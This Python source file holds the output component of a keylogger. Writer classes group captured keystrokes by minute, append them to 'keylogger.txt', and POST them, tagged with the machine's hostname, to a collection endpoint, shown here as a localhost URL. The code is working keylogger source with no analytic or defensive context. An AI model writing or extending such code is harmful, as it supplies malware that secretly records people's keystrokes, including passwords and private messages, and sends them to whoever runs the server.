from abc import ABC,abstractmethod
from datetime import datetime
from pathlib import Path
from _socket import gethostname
from requests import post

class IWriter(ABC):
    """Abstract class for Interface Writer with write method"""
    @abstractmethod
    def write(self, data) -> None:
        pass

class DictWriter(IWriter):
    """Dictionary writer class with write method
    which get data as list and write it to a dictionary,
    minutes as keys and text as values"""

    def __init__(self):
        self.dct = {}

    def get_dict(self) -> dict:
        """reset the object dictionary and return the last dictionary"""
        current_dict = self.dct.copy()
        self.dct = {}
        return current_dict

    @staticmethod
    def _cur_min():
        """Return the current minute as a string"""
        return datetime.now().strftime("%d/%m/%Y_%H:%M")

    def write(self, data: list) -> None:
        """Write the given list of characters to the dictionary."""
        data_str = "".join(data)
        if self._cur_min() not in self.dct.keys():
            self.dct[self._cur_min()] = data_str
        else:
            self.dct[self._cur_min()] += data_str


class FileWriter(IWriter):
    """File writer class with write method
    which get data as string and write it to a text file."""
    def __init__(self, path = None):
        if not path:
            path = self.file_path = Path(path) if path else Path.cwd() / "keylogger.txt"
        self.file_path = path

    def write(self, data: str) -> None:
        """Write the given text to a text file"""
        with open(self.file_path, "a") as file:
            file.write(data+"\n")


class NetworkWriter(IWriter):
    """Network Writer class with write method
    which get data as string and write it to a server"""
    def write(self, data: str) -> None:
        post(url=f"http://127.0.0.1:5000/api/computers/{gethostname()}", data=data)